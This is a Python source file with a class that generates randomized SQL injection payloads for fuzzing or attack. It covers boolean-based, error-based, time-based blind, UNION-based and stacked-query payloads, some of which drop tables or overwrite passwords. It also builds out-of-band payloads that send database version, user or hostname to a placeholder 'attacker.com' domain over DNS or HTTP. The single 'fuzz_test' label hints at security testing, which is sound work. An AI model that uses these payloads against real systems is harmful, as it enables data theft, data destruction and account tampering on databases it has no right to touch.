import random

class SQLiPayloadGenerator:
    """
    Generates various types of SQL Injection payloads with randomized components.
    """

    @staticmethod
    def _get_random_comment() -> str:
        """Returns a random SQL comment style."""
        return random.choice(["--", "#", "/*", " "])

    @staticmethod
    def _get_random_true_condition() -> str:
        """Returns a random SQL true condition."""
        choice = random.randint(0, 2)
        if choice == 0:
            return f"{random.randint(1, 99)}={random.randint(1, 99)}"
        elif choice == 1:
            char = random.choice('abcdefghijklmnopqrstuvwxyz')
            return f"'{char}'='{char}'"
        else:
            return "TRUE"

    @staticmethod
    def _get_random_false_condition() -> str:
        """Returns a random SQL false condition."""
        choice = random.randint(0, 2)
        if choice == 0:
            return f"{random.randint(1, 99)}={random.randint(100, 199)}"
        elif choice == 1:
            char1 = random.choice('abcdefghijklmnopqrstuvwxyz')
            char2 = random.choice('abcdefghijklmnopqrstuvwxyz')
            while char1 == char2:
                char2 = random.choice('abcdefghijklmnopqrstuvwxyz')
            return f"'{char1}'='{char2}'"
        else:
            return "FALSE"

    @staticmethod
    def generate_boolean_based_payload() -> str:
        """Generates a random boolean-based SQLi payload."""
        prefix = random.choice(["' OR ", "\" OR ", " OR ", "' AND ", "\" AND ", " AND "])
        condition = SQLiPayloadGenerator._get_random_true_condition()
        suffix = SQLiPayloadGenerator._get_random_comment()
        return f"{prefix}{condition}{suffix}"

    @staticmethod
    def generate_error_based_payload() -> str:
        """Generates a random error-based SQLi payload for MySQL/MariaDB."""
        function = random.choice(["EXTRACTVALUE", "UPDATEXML"])
        target = random.choice(["version()", "database()", "user()", "current_user()"])
        payload = f"' AND (SELECT {function}(1,CONCAT(0x7e,({target}),0x7e))){SQLiPayloadGenerator._get_random_comment()}"
        return payload

    @staticmethod
    def generate_time_based_payload() -> str:
        """Generates a random time-based blind SQLi payload."""
        delay = random.randint(3, 7)
        db_type = random.choice(["mysql_pg", "sqlserver"])
        condition = SQLiPayloadGenerator._get_random_true_condition()

        if db_type == "mysql_pg":
            payload = f"' AND {condition} AND SLEEP({delay}){SQLiPayloadGenerator._get_random_comment()}"
        else:
            payload = f"' AND {condition} AND WAITFOR DELAY '0:0:{delay}'{SQLiPayloadGenerator._get_random_comment()}"
        return payload

    @staticmethod
    def generate_union_based_payload() -> str:
        """Generates a random union-based SQLi payload."""
        num_cols = random.randint(2, 8)
        select_parts = []
        info_functions = ["version()", "database()", "user()"]

        info_index = random.randint(0, num_cols - 1)
        for i in range(num_cols):
            if i == info_index:
                select_parts.append(random.choice(info_functions))
            else:
                select_parts.append("NULL")

        payload = f"' UNION SELECT {', '.join(select_parts)}{SQLiPayloadGenerator._get_random_comment()}"
        return payload

    @staticmethod
    def generate_stacked_query_payload() -> str:
        """Generates a random stacked query SQLi payload."""
        action = random.choice(["DROP", "INSERT", "UPDATE"])
        table = random.choice(["users", "products", "orders", "config"])
        payload = ""
        if action == "DROP":
            payload = f"'; DROP TABLE {table};{SQLiPayloadGenerator._get_random_comment()}"
        elif action == "INSERT":
            col1 = random.choice(["name", "email", "product_name"])
            val1 = f"'fuzz_test_{random.randint(100, 999)}'"
            payload = f"'; INSERT INTO {table} ({col1}) VALUES ({val1});{SQLiPayloadGenerator._get_random_comment()}"
        elif action == "UPDATE":
            col = random.choice(["password", "price", "status"])
            value = f"'{random.randint(1000, 9999)}'" if col == "price" else "'hacked_pw'"
            payload = f"'; UPDATE {table} SET {col}={value} WHERE id=1;{SQLiPayloadGenerator._get_random_comment()}"
        return payload

    @staticmethod
    def generate_oob_payload() -> str:
        """Generates a random out-of-band SQLi payload (e.g., DNS exfiltration)."""
        exfil_domain = f"exfil-{random.randint(100, 999)}.attacker.com"
        info_to_exfil = random.choice(["version()", "database()", "user()", "@@hostname"])

        oob_type = random.choice(["dns_mysql", "http_oracle"])

        payload = ""
        if oob_type == "dns_mysql":
            payload = f"' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT {info_to_exfil}),'.{exfil_domain}\\abc'))){SQLiPayloadGenerator._get_random_comment()}"
        elif oob_type == "http_oracle":
            payload = f"' AND UTL_HTTP.REQUEST('http://{exfil_domain}/'||{info_to_exfil}){SQLiPayloadGenerator._get_random_comment()}"
        return payload

    @staticmethod
    def get_random_sqli_payload() -> str:
        """Returns a random SQLi payload by choosing from different generation types."""
        generator_functions = [
            SQLiPayloadGenerator.generate_boolean_based_payload,
            SQLiPayloadGenerator.generate_error_based_payload,
            SQLiPayloadGenerator.generate_time_based_payload,
            SQLiPayloadGenerator.generate_union_based_payload,
            SQLiPayloadGenerator.generate_stacked_query_payload,
            SQLiPayloadGenerator.generate_oob_payload,
        ]
        chosen_generator = random.choice(generator_functions)
        return chosen_generator()
